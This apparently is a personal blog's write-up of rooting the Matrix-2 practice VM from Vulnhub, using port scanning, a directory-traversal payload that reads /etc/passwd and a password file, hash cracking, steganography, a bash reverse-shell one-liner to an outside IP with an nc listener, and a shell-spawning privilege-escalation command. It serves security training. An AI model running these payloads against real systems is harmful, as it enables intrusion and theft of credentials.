@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta property="og:type" content="article">
+<meta property="og:title" content="Matrix-2 Writeup">
+<meta property="og:url" content="https://mrt4ntr4.github.io/Matrix-2-Writeup/index.html">
+<meta property="og:site_name" content="mrT4ntr4&#39;s Blog">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/redblue.jpg">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/1.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/2.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/3.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/4.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/5.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/6.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/7.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/8.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/9.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/10.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/11.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/12.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/13.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/14.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/15.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/16.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/17.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/18.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/19.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/20.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/21.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/22.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/23.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/24.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/25.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/26.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/27.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/28.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/29.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/30.png">
+<meta property="og:image" content="https://mrt4ntr4.github.io/img/matrix2/31.png">
+<meta property="article:published_time" content="2019-04-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2020-12-30T07:06:15.001Z">
+<meta property="article:author" content="Suraj Malhotra">
+<meta property="article:tag" content="boot2root">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="matrix2">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mrt4ntr4.github.io/img/matrix2/redblue.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Matrix-2 Writeup</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/feed.xml" title="mrT4ntr4&#39;s Blog" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<div class="background">
+    <div class="banner">
+<div id="blogtitle" class="blogtitle">mrT4ntr4&#39;s Blog</div>
+<ul id="wrapper" class="wrapper">
+  <div class="sun">
+    <div class="star"></div>
+  </div>
+  <div class="mercury">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="venus">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="earth">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="mars">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="jupiter">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+</ul>
+</div>
+
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/Win-Crackme1/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/UTCTF-RegularZips-Writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://mrt4ntr4.github.io/Matrix-2-Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://mrt4ntr4.github.io/Matrix-2-Writeup/&text=Matrix-2 Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://mrt4ntr4.github.io/Matrix-2-Writeup/&title=Matrix-2 Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://mrt4ntr4.github.io/Matrix-2-Writeup/&is_video=false&description=Matrix-2 Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Matrix-2 Writeup&body=Check out this article: https://mrt4ntr4.github.io/Matrix-2-Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://mrt4ntr4.github.io/Matrix-2-Writeup/&title=Matrix-2 Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://mrt4ntr4.github.io/Matrix-2-Writeup/&title=Matrix-2 Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://mrt4ntr4.github.io/Matrix-2-Writeup/&title=Matrix-2 Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://mrt4ntr4.github.io/Matrix-2-Writeup/&title=Matrix-2 Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://mrt4ntr4.github.io/Matrix-2-Writeup/&name=Matrix-2 Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://mrt4ntr4.github.io/Matrix-2-Writeup/&t=Matrix-2 Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Netdiscover-Scan"><span class="toc-number">1.</span> <span class="toc-text">Netdiscover Scan</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nmap-Scan"><span class="toc-number">2.</span> <span class="toc-text">Nmap Scan</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#User-Enumeration"><span class="toc-number">3.</span> <span class="toc-text">User Enumeration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">4.</span> <span class="toc-text">Privilege Escalation</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Matrix-2 Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Suraj Malhotra</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-04-01T00:00:00.000Z" itemprop="datePublished">2019-04-01</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/boot2root-VMs/">boot2root VMs</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/boot2root/" rel="tag">boot2root</a>, <a class="tag-link-link" href="/tags/matrix2/" rel="tag">matrix2</a>, <a class="tag-link-link" href="/tags/writeup/" rel="tag">writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="/img/matrix2/redblue.jpg" title="banner" class="gallery-item"><img src="/img/matrix2/redblue.jpg" alt="banner"></a></p>
+<p>To begin with, I took some time from my so called <em>Busy</em> routine XD and rooted Matrix-2 from vulnhub which is a successor to the Matrix series..<br>If you haven’t checked the <a href="https://mrt4ntr4.github.io/Matrix-Writeup/" target="_blank">first one</a>, Plz do .. if you really are a MATRIX Fan. XD  </p>
+<p>Download <a href="https://www.vulnhub.com/entry/matrix-2,279/" target="_blank">here</a></p>
+<p>Also Thanks <a href="https://twitter.com/unknowndevice64" target="_blank">./unknowndevice64</a><br> for adding another child to the Matrix Series.  </p>
+<p>And you see, I keep my promise. For those of you who don’t know it, I promised that  I’ll bring my writeup on the second one in Matrix-1 writeup.</p>
+<p>So Yeah!! Our machine booted successfully..</p>
+<p><a href="/img/matrix2/1.png" class="gallery-item"><img src="/img/matrix2/1.png"></a></p>
+<h1 id="Netdiscover-Scan"><a href="#Netdiscover-Scan" class="headerlink" title="Netdiscover Scan"></a>Netdiscover Scan</h1><p>To begin with, I did a netdiscover scan to find the IP of the matrix machine running on VirtualBox.  </p>
+<p><a href="/img/matrix2/2.png" class="gallery-item"><img src="/img/matrix2/2.png"></a></p>
+<h1 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h1><p>And then moving on further, we get port 80, 1337, 12320 and 12322 as opened ports.  </p>
+<p>Hell these are a lot of ports.. ikr  </p>
+<p><a href="/img/matrix2/3.png" class="gallery-item"><img src="/img/matrix2/3.png"></a><br><a href="/img/matrix2/4.png" class="gallery-item"><img src="/img/matrix2/4.png"></a><br><a href="/img/matrix2/5.png" class="gallery-item"><img src="/img/matrix2/5.png"></a></p>
+<p>And One more thing! Dirb Scan didn’t help.  </p>
+<h1 id="User-Enumeration"><a href="#User-Enumeration" class="headerlink" title="User Enumeration"></a>User Enumeration</h1><p>Checking the default HTTP Port ie 80, we get some twinking stars as background and my curiosity took me to <a href="https://codepen.io/WebSonick/pen/vjmgu" target="_blank">this</a> codepen’s snippet. And some text saying <strong>Welcome In Matrix v2, Mr.NEO</strong></p>
+<p><a href="/img/matrix2/6.png" class="gallery-item"><img src="/img/matrix2/6.png"></a></p>
+<p>Further checking the source code of the page, I found a suspicious javascript file <strong>index.js</strong>  </p>
+<p><a href="/img/matrix2/7.png" class="gallery-item"><img src="/img/matrix2/7.png"></a></p>
+<p>I didn’t know really what was it meant for.<br>Was it a part of the page’s animation stuff or just a troll related to the MATRIX Movie.<br>You might be wondering why does he even want us to know this shit…<br>But this shit was really not important XD.  </p>
+<p><a href="/img/matrix2/8.png" class="gallery-item"><img src="/img/matrix2/8.png"></a></p>
+<p>So taking a keen look at some other ports.  </p>
+<p>I found that both ports 1337 and 12320 had a login prompt.  </p>
+<p><a href="/img/matrix2/9.png" class="gallery-item"><img src="/img/matrix2/9.png"></a></p>
+<p><a href="/img/matrix2/10.png" class="gallery-item"><img src="/img/matrix2/10.png"></a></p>
+<p>But the 12322 gave me a lead as the robots.txt had a disallowed entry for a file named <strong>file_view.php</strong></p>
+<p><a href="/img/matrix2/11.png" class="gallery-item"><img src="/img/matrix2/11.png"></a></p>
+<p>Navigating to the file in our browser gave us a blank white page.. which is quite sad.  </p>
+<p><a href="/img/matrix2/12.png" class="gallery-item"><img src="/img/matrix2/12.png"></a></p>
+<p>But no problem, we still have the almighty source.<br>And It commented <em>Error file parameter missing</em>  </p>
+<p><a href="/img/matrix2/13.png" class="gallery-item"><img src="/img/matrix2/13.png"></a>   </p>
+<p>So I then used some parameters with a GET Request as well like …  </p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.42.201:12322/file_view.php?file=/etc/passwd</span><br></pre></td></tr></table></figure>
+<p>and still got the f** <strong>blank white page</strong>  </p>
+<p>But after some time, I tried my luck with Burp and to my surprise I was able to view the contents of <strong>/etc/passwd</strong> file and it was a directory traversal exploit.  </p>
+<p><a href="/img/matrix2/14.png" class="gallery-item"><img src="/img/matrix2/14.png"></a>  </p>
+<p>As you can see from the Screenshot that I changed my Request to Post and especially the following :  </p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>
+<p>This was really important with burp as it was simply showing that blank page repeatedly when tried with no Content-Type.<br>TBH It took a while to figure this out.. XD<br>Well I learnt something !!</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file = ../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+<p><a href="/img/matrix2/15.png" class="gallery-item"><img src="/img/matrix2/15.png"></a>  </p>
+<p>So Now we know that there is a user named <strong>n30</strong></p>
+<p>Not only this.. I was also able to see <strong>/proc/version</strong>  </p>
+<p><a href="/img/matrix2/16.png" class="gallery-item"><img src="/img/matrix2/16.png"></a>  </p>
+<p>and <strong>/etc/crontab</strong>  to see the scheduled jobs.  </p>
+<p><a href="/img/matrix2/17.png" class="gallery-item"><img src="/img/matrix2/17.png"></a>  </p>
+<p>Well <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank">this</a> blogpost is really a heaven in case of Linux Priv Esc. </p>
+<p>And as we can observe the server is nginx in the Response Headers !! It was obvious to check <strong>/etc/nginx/sites-available/default</strong>  </p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file = ../../../../../etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure>
+<p><a href="/img/matrix2/18.png" class="gallery-item"><img src="/img/matrix2/18.png"></a>  </p>
+<p>Here we see that a password is stored in <strong>/var/www/p4ss/.htpasswd</strong><br>Ok np lets take a look at that too.  </p>
+<p><a href="/img/matrix2/19.png" class="gallery-item"><img src="/img/matrix2/19.png"></a>  </p>
+<p>And hell yeah we are presented with a password hash for a user named <strong>Tr1n17y</strong>     </p>
+<p><a href="/img/matrix2/20.png" class="gallery-item"><img src="/img/matrix2/20.png"></a>  </p>
+<p>Now heading over to some noob methods of cracking a password hash, I use john with my wordlist as the common rockyou.txt.  </p>
+<p><a href="/img/matrix2/21.png" class="gallery-item"><img src="/img/matrix2/21.png"></a>  </p>
+<p>Later, I use the following creds to login into 1337 port’s login prompt.  </p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: Tr1n17y</span><br><span class="line">Password: admin</span><br></pre></td></tr></table></figure>
+<p><a href="/img/matrix2/22.png" class="gallery-item"><img src="/img/matrix2/22.png"></a>  </p>
+<p>Now, as we know from the /etc/passwd file that there is a user named n30. Here we get some red text with the same.  </p>
+<p><a href="/img/matrix2/23.png" class="gallery-item"><img src="/img/matrix2/23.png"></a>  </p>
+<p>But going through the source, Everything looked similar to the 80’s port except all the css and js files were being imported from the <strong>/4cc3ss</strong> dir.  I don’t know whether there was another method of exploitation or anything like that..  </p>
+<p><a href="/img/matrix2/24.png" class="gallery-item"><img src="/img/matrix2/24.png"></a>  </p>
+<p>Also there was a jpeg file commented out named <strong>h1dd3n.jpg</strong> which was a classic steganography chall.  </p>
+<p><a href="/img/matrix2/25.png" class="gallery-item"><img src="/img/matrix2/25.png"></a>  </p>
+<p>I downloaded the image and used my own tool ie. <a href="https://github.com/mrT4ntr4/Stegall" target="_blank">Stegall</a> (AKA The father of all stego tools) XD.</p>
+<p>I used steghide with the password as n30 which can easily be guessed, atleast by me.  </p>
+<p><a href="/img/matrix2/26.png" class="gallery-item"><img src="/img/matrix2/26.png"></a>  </p>
+<p>And Later I used these Creds to login into port 12322’s prompt.</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username: n30</span><br><span class="line">Password: p4$$w0rd</span><br></pre></td></tr></table></figure>
+<p>Now we can also get a reverse shell incase you don’t like a webshell like me.. XD<br>I used <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank">this</a> reverse shell cheatsheet from pentestmonkey to grab a oneliner. </p>
+<p>I checked my IP and choosed my port to be 4433.  </p>
+<p><a href="/img/matrix2/27.png" class="gallery-item"><img src="/img/matrix2/27.png"></a>   </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p><a href="/img/matrix2/28.png" class="gallery-item"><img src="/img/matrix2/28.png"></a>  </p>
+<p>Well we require a listener also..  </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 4433</span><br></pre></td></tr></table></figure>
+<p><a href="/img/matrix2/29.png" class="gallery-item"><img src="/img/matrix2/29.png"></a>  </p>
+<p>And as we know we are USER.</p>
+<p><a href="/img/matrix2/30.png" class="gallery-item"><img src="/img/matrix2/30.png"></a>  </p>
+<h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>This was the easiest machine particularly for Priv Esc I’ve found on vulnhub.. as of now, as you can see there are barely 3 screenshots lying below XD</p>
+<p>Now I gather some info using <strong>ls</strong> ofc.<br>And my boy there it is <strong>.bash_history</strong>.  </p>
+<p><a href="/img/matrix2/31.png" class="gallery-item"><img src="/img/matrix2/31.png"></a>  </p>
+<p>After reading its content, it is pretty obvious that someone had tried the command :</p>
+<pre><code class="sh">morpheus &#39;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#39;
+```sh
+
+and got the root flag..  
+
+![](/img/matrix2/32.png)  
+
+Literally I didn&#39;t knew what the hell was **morpheus** before this machine.. So I googled a bit and found that it was just another CLI with more functionalities and stuff.  
+You can read the docs &lt;a href=&quot;https://docs.morpheusdata.com/en/3.6.1/getting_started/cli/cli_master.html&quot; target=&quot;_blank&quot;&gt;here&lt;/a&gt;.
+So simply repeating it, we can too get it ryt...  
+
+![](/img/matrix2/33.png)  
+
+and B00mYa !! This machine was pretty interesting as it focuses on some minute details of enumerating a machine.  
+
+
+And Hey If you like my posts please subscribe to my newsletter.. It&#39;ll barely take a minute. And you see there is no f** popup which forces you to subscribe ... HAHA 
+
+Also If you have some suggestions for improvements and If I&#39;ve mistaken somewhere in explaining you can just write it down in the comments section.
+
+Meet you with another post!! Till then, Happy Hacking :)</code></pre>
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Netdiscover-Scan"><span class="toc-number">1.</span> <span class="toc-text">Netdiscover Scan</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nmap-Scan"><span class="toc-number">2.</span> <span class="toc-text">Nmap Scan</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#User-Enumeration"><span class="toc-number">3.</span> <span class="toc-text">User Enumeration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">4.</span> <span class="toc-text">Privilege Escalation</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://mrt4ntr4.github.io/Matrix-2-Writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://mrt4ntr4.github.io/Matrix-2-Writeup/&text=Matrix-2 Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://mrt4ntr4.github.io/Matrix-2-Writeup/&title=Matrix-2 Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://mrt4ntr4.github.io/Matrix-2-Writeup/&is_video=false&description=Matrix-2 Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Matrix-2 Writeup&body=Check out this article: https://mrt4ntr4.github.io/Matrix-2-Writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://mrt4ntr4.github.io/Matrix-2-Writeup/&title=Matrix-2 Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://mrt4ntr4.github.io/Matrix-2-Writeup/&title=Matrix-2 Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://mrt4ntr4.github.io/Matrix-2-Writeup/&title=Matrix-2 Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://mrt4ntr4.github.io/Matrix-2-Writeup/&title=Matrix-2 Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://mrt4ntr4.github.io/Matrix-2-Writeup/&name=Matrix-2 Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://mrt4ntr4.github.io/Matrix-2-Writeup/&t=Matrix-2 Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021
+    Suraj Malhotra
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"CTRL+C\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+      setTimeout(function() {
+        e.trigger.setAttribute('aria-label', "CTRL+C");
+      }, 2000);
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
